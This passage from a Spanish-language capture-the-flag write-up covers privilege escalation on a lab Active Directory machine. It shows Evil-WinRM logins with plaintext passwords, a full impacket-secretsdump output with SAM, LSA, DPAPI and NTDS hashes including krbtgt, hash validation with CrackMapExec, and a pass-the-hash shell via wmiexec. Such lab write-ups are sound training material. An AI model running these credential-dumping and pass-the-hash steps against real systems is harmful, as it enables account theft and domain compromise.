Evil-WinRM shell v3.5
                                        
Warning: Remote path completion is disabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami
vulnnet-rst\a-whitehat
*Evil-WinRM* PS C:\Users\a-whitehat\Documents>
```

```bash
❯ evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.231.139 -N
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completion is disabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> whoami
vulnnet-rst\enterprise-core-vn
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> 
```

A este punto ya podemos observar la primer flag (user.txt); ahora debemos encontrar una forma de escalar privilegios. Como tenemos acceso a la máquina, podemos tratar de dumpear la SAM:

```bash
❯ impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.231.139
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:cdb1f4624a94e771cc4c7994ffdeb23a6ab854332da75c1c0b947eaf81bce418
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:8d8a6ec8b7de857a9b6bd6b4e2dc9838
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:70a26bab49160d73
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:66c966cc92966bad23f06b27b63821f4e364d77d355e4b2446b6e8e4d718d7064849b683f0fe2cd630565b0db1b0d9535f72036fa09fc6483364336ad8fecd3582cbf84a97b2c02d18b9e45f32e58accec23ce1cf9df38b95b9ed1f4d0f8e932cf9c04feeb7a2f129cc29dfb9f630079c5f96f5459eef3253cbba66d99ff530e1c43833620706c9a4faeea8c180d8fff10475efbacb2e2fce888577bd00b76d555152e0f6e255cea457c8d54ca4db9043d0dc9d2ea2c034dfdb006ab7d85799a561e6d41857bb47ff57cf4cc9f0bbbdd3709e3ad14fca22d0a7057ec3fa72083f6a6c6d2531888415ef65bab04dfd18d
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:6beaeb23bfa33fc71d76784b80127eff:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM 
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:6beaeb23bfa33fc71d76784b80127eff:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:cdb1f4624a94e771cc4c7994ffdeb23a6ab854332da75c1c0b947eaf81bce418
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:8d8a6ec8b7de857a9b6bd6b4e2dc9838
WIN-2BO8M1OE1M1$:des-cbc-md5:3bdf456be5f72cd6
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

Ya tenemos el hash del usuario Administrator, así que vamos a validarlas:

```bash
❯ cme smb 10.10.231.139 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d' --shares
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\Administrator:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d (Pwn3d!)
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  [+] Enumerated shares
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  Share           Permissions     Remark
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  -----           -----------     ------
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  C$              READ,WRITE      Default share
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  IPC$            READ            Remote IPC
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  SYSVOL          READ            Logon server share 
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  VulnNet-Business-Anonymous READ            VulnNet Business Sharing
SMB         10.10.231.139   445    WIN-2BO8M1OE1M1  VulnNet-Enterprise-Anonymous READ            VulnNet Enterprise Sharing
```

Ya podemos acceder a la máquina como el usuario **Administrator**:

```bash
❯ impacket-wmiexec vulnnet-rst.local/Administrator@10.10.38.217 -hashes aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
vulnnet-rst\administrator

C:\>
```

Ya somos el usuario **Administrator** y podemos visualizar la flag (root.txt).